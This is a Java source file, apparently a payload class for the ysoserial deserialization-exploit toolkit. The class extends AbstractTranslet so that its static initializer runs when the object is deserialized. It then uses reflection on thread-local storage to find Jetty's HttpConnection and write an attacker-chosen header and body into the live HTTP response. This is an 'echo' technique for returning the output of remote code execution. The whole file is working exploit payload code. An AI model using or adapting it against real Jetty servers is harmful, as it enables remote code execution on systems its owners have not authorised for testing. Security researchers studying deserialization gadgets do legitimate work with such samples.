package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import org.eclipse.jetty.server.HttpConnection;

// https://www.cnblogs.com/ph4nt0mer/p/12785168.html

public class MyClassLoader9 extends AbstractTranslet {
    static {
        try {

            Object obj =  Thread.currentThread();
            Field field = obj.getClass().getDeclaredField("threadLocals");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);

            Object[] entrys = (Object[]) obj;
            for (Object entry : entrys){
                try {
                    Field f = entry.getClass().getDeclaredField("value");
                    f.setAccessible(true);
                    Object fieldValue = f.get(entry);
                    if (fieldValue instanceof HttpConnection){
                        ((HttpConnection) fieldValue).getHttpChannel().getRequest().getResponse().setHeader("xx1111","dd");
                        ((HttpConnection) fieldValue).getHttpChannel().getRequest().getResponse().getWriter().println("test!!!!");
                    }
                }catch (Exception e){
                    continue;
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

